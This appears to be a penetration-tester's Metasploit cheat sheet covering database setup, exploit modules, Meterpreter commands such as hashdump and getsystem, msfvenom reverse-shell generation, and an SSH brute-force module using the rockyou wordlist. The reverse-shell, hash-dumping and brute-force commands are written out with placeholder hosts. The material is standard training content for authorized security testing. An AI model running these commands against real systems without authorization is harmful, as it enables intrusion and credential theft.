---
sidebar_position: 1
title: Metasploit Framework
---

# Metasploit Framework

## Setup

Default configuration does not start the database. Benefits of using it include storing target host data and tracking exploitation attempts.

```bash
sudo msfdb init
sudo systemctl enable postgresql
```

Launch and verify database:

```bash
msfconsole
db_status
```

### Workspaces

```
workspace                # List workspaces
workspace -a <name>      # Create new workspace
```

### Working with the Database

Scan with Nmap and save results directly:

```
db_nmap -sCV -p- $TARGET
hosts                    # List discovered hosts
services                 # List discovered services
services -p 8000         # Filter by port
vulns                    # Show detected vulnerabilities
creds                    # Show found credentials
```

---

## Module Types

```
show -h                  # Display all module types
```

### Auxiliary Modules

```
show auxiliary
search type:auxiliary smb
use <module>
info                     # Module details
show options             # Required parameters
set RHOSTS $TARGET
run
```

### Exploit Modules

```
search type:exploit <keyword>
use <module>
show options
set RHOSTS $TARGET
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
exploit
```

### Payloads — Staged vs Stageless

**Staged** (e.g., `windows/x64/meterpreter/reverse_tcp`):
- Sends a small stager first, then downloads the full payload
- Smaller initial payload, but requires callback

**Stageless** (e.g., `windows/x64/meterpreter_reverse_tcp`):
- Entire payload sent at once
- Larger but self-contained

:::tip
The `/` between `meterpreter` and `reverse_tcp` indicates staged. An `_` indicates stageless.
:::

---

## Session Management

```
sessions              # List active sessions
sessions -i <id>      # Interact with a session
sessions -K           # Kill all sessions
```

---

## Meterpreter

Core commands once you have a meterpreter session:

```
sysinfo               # System information
getuid                # Current user
getsystem             # Attempt SYSTEM escalation
hashdump              # Dump password hashes
upload <file>         # Upload a file
download <file>       # Download a file
shell                 # Drop to OS shell
```

### getsystem

The `getsystem` command uses three techniques to escalate from local admin to SYSTEM:
1. Named pipe impersonation (requires local admin)
2. Named pipe impersonation variant (requires local admin)
3. Token duplication (requires `SeDebugPrivilege`, x86 only)

:::warning
`getsystem` is designed for local admin → SYSTEM escalation, not user → admin. It should not be thought of as a general privilege escalation method on modern systems.
:::

---

## msfvenom (Payload Generation)

Windows reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o reverse.exe
```

Linux reverse shell:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o reverse.elf
```

Linux exec (e.g., for NFS SUID):

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
```

MSI installer:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o reverse.msi
```

---

## SSH Brute Force Module

```
use scanner/ssh/ssh_login
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME $USER
set RHOSTS $TARGET
set RPORT 22
run
creds                # View found credentials
```
